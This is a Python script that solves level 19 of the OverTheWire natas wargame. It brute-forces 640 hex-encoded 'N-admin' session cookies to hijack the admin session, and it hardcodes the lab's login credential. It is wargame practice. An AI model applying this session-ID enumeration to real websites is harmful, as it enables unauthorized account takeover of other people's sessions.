#! /usr/bin/env python3
'''
from 1 to 640 + "-admin" and convert it to hex
then test if this is the correct admin password (bruteforce)
'''
import aiohttp
import asyncio
import time


url = "http://natas19.natas.labs.overthewire.org/"
auth = aiohttp.BasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')
fail_str = "You are logged in as a regular user."

async def scrape_task(w):
    async with aiohttp.ClientSession() as session:
        cookies = {'PHPSESSID': w}
        async with session.get(url, auth=auth, cookies=cookies) as resp:
            text = await resp.text()
            if fail_str not in text:
                print('FOUND IT!!')
                print(text)


def gener(n):
    for i in range(1, n + 1):
        yield f'{i}-admin'.encode('utf-8').hex()


async def main():
    tasks = []
    for w in gener(640):
        tasks.append(scrape_task(w))
    await asyncio.wait(tasks)


if __name__ == "__main__":
    t1 = time.perf_counter()
    asyncio.run(main())
    t2 = time.perf_counter() - t1
    print(f'Total time taken: {t2:0.2f} seconds')
